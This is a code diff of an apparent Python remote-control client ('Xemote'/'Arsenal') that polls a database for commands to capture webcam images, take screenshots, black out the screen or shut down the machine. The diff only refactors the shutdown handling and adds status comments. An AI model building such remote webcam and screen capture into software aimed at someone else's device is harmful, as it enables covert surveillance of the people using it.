@@ -278,9 +278,10 @@ class Arsenal(Database):
     ~ Description: Update MySQL database using a parameterized query
     '''
     def device_shutdown_state(self, state):
-        if state in ["shutdown", "reboot", "logoff"]:
+        if state in [1, 2, 3]:
             self.user['command']['shutdown'] = 0
             super().put()
+            self.__del__()
         if state == 1:
             subprocess.call(["shutdown", "/s"])
         elif state == 2:
@@ -289,6 +290,8 @@ class Arsenal(Database):
             subprocess.call(["shutdown", "/l"])
         else:
             print("Invalid command")
+        
+        exit()
 
     def __del__(self):
         super().__del__()  # Call the parent class's __del__ method for cleanup
@@ -355,6 +358,7 @@ class Xemote(Arsenal):
             # Check Webcam Command State
             # 0: No Command, 1: Capture Image
             # Priority: 1
+            # STATUS: COMPLETED
             if self.user['command']['webcam'] == 1:
                 if self.user['Ongoing']['webcam'] == False:
                     self.user['Ongoing']['webcam'] = True
@@ -366,6 +370,7 @@ class Xemote(Arsenal):
             # Check Screenshot Command State
             # 0: No Command, 1: Capture Screenshot
             # Priority: 2
+            # STATUS: COMPLETED
             if self.user['command']['screenshot'] == 1:
                 if self.user['Ongoing']['screenshot'] == False:
                     self.user['Ongoing']['screenshot'] = True
@@ -377,6 +382,7 @@ class Xemote(Arsenal):
             # Check Blackout Command State
             # 0: No Command, 1: Blackout
             # Priority: 3
+            # STATUS: COMPLETED
             if self.user['command']['blackout'] == 1:
                 if self.user['Ongoing']['blackout'] == False:
                     self.user['Ongoing']['blackout'] = True
@@ -418,10 +424,7 @@ class Xemote(Arsenal):
             if self.user['command']['shutdown'] in [1, 2, 3]:
                 if self.user['Ongoing']['shutdown'] == False:
                     self.user['Ongoing']['shutdown'] = True
-                    self.user['command']['shutdown'] = 0
-                    self.put()
-                    super().__del__()
-                    print("Shutdown")
+                    self.device_shutdown_state(self.user['command']['shutdown'])
 
             time.sleep(2)
 
